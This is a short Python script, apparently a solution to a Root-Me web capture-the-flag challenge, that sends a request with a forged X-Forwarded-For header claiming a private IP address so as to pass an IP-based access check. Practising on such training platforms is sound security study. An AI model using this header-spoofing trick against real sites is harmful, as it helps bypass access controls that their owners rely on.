import requests

url = "http://challenge01.root-me.org/web-serveur/ch68/"

headers = {
    "X-Forwarded-For": "192.168.29.1" 
}

response = requests.get(url, headers=headers)
print(response.text)
